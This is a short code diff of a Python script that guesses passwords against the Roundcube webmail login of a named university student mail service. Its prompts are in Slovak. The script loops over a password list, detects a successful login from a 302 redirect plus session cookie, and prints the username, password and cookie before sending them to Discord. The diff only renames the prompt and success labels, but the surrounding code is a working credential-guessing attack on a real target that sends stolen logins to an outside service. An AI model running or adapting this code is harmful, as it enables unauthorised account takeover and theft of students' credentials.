@@ -1,6 +1,6 @@
 import requests
 
-username = input("Zadaj username: ")  
+username = input("[*] Zadaj username: ")  
 
 
 url = "https://studentmail.ukf.sk/webmail/"           
@@ -47,7 +47,7 @@ for pw in payloads:
     # kontrola uspechu: 302 redirect + cookie roundcube_sessid
     sess_cookie = resp.cookies.get("roundcube_sessid")
     if resp.status_code == 302 and sess_cookie:
-        msg = f"[OK] Username: {username} | Password: {pw} | Session cookie: {sess_cookie}"
+        msg = f"[FOUND] Username: {username} | Password: {pw} | Session cookie: {sess_cookie}"
         print(msg)           
         notify_discord(msg)  
         break                
